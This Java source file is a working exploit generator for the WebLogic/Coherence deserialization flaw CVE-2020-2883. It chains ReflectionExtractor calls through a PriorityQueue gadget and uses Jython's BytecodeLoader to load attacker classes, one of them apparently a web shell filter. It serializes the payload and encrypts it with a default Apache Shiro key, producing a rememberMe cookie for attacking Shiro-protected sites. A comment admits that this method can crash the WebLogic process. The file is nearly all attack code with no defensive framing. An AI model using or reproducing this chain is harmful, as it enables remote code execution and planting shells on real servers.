package org.chabug.cve;

import org.chabug.utils.Serializables;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import javassist.ClassPool;
import javassist.CtClass;
import org.python.util.PythonInterpreter;
import org.unicodesec.EncryptUtil;
import ysoserial.payloads.util.Reflections;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CVE_2020_2883_BytecodeLoader {

    public static void main(String[] args) throws Exception {

        String ctClass1 = "org.chabug.payloads.MyFilter";
        String ctClass2 = "org.chabug.payloads.WebLogicEcho";

        ClassPool pool = ClassPool.getDefault();

        CtClass shellClass = pool.get(ctClass1);
        CtClass WebLogicEchoClass = pool.get(ctClass2);
        byte[] shellClassbytes = shellClass.toBytecode();
        byte[] WebLogicEchoClassbytes = WebLogicEchoClass.toBytecode();

        String shellClassStr = "";
        for (byte b : shellClassbytes) {
            shellClassStr += String.format("%s%s", b, ",");
        }
        System.out.println(shellClassStr);

        String WebLogicEchoClassStr = "";
        for (byte b : WebLogicEchoClassbytes) {
            WebLogicEchoClassStr += String.format("%s%s", b, ",");
        }
        System.out.println(WebLogicEchoClassStr);
        // TODO
        // Using PythonInterpreter to define bytecode will cause weblogic to overflow and then exit the weblogic process
        // 使用PythonInterpreter定义字节码会导致weblogic溢出，导致weblogic直接挂掉
        ReflectionExtractor reflectionExtractor1 = new ReflectionExtractor("getConstructor", new Object[]{new Class[0]});
        ReflectionExtractor reflectionExtractor2 = new ReflectionExtractor("newInstance", new Object[]{new Object[0]});
        String p = String.format("from org.python.core import BytecodeLoader;\n" +
                "from jarray import array\n" +
                "myList = [%s]\n" +
                "bb = array( myList, 'b')\n" +
                "BytecodeLoader.makeClass(\"%s\",None,bb).getConstructor([]).newInstance([]);", WebLogicEchoClassStr, ctClass2);
        ReflectionExtractor reflectionExtractor3 = new ReflectionExtractor("exec",
                new Object[]{p}
        );
        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                reflectionExtractor1,
                reflectionExtractor2,
                reflectionExtractor3
        };
        Class clazz = ChainedExtractor.class.getSuperclass();
        Field m_aExtractor = clazz.getDeclaredField("m_aExtractor");
        m_aExtractor.setAccessible(true);

        ReflectionExtractor reflectionExtractor = new ReflectionExtractor("toString", new Object[]{});
        ValueExtractor[] valueExtractors1 = new ValueExtractor[]{
                reflectionExtractor
        };

        ChainedExtractor chainedExtractor1 = new ChainedExtractor(valueExtractors1);

        PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor1));
        queue.add("1");
        queue.add("1");
        m_aExtractor.set(chainedExtractor1, valueExtractors);

        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = PythonInterpreter.class;
        queueArray[1] = "1";

        byte[] buf = Serializables.serialize(queue);
        String key = "kPH+bIxk5D2deZiIxcaaaA==";
        String rememberMe = EncryptUtil.shiroEncrypt(key, buf);
        System.out.println(rememberMe);

        // test
        serialize(queue);
//        deserialize();

    }

    public static void serialize(Object obj) {
        try {
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("test.ser"));
            os.writeObject(obj);
            os.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void deserialize() {
        try {
            ObjectInputStream is = new ObjectInputStream(new FileInputStream("test.ser"));
            is.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
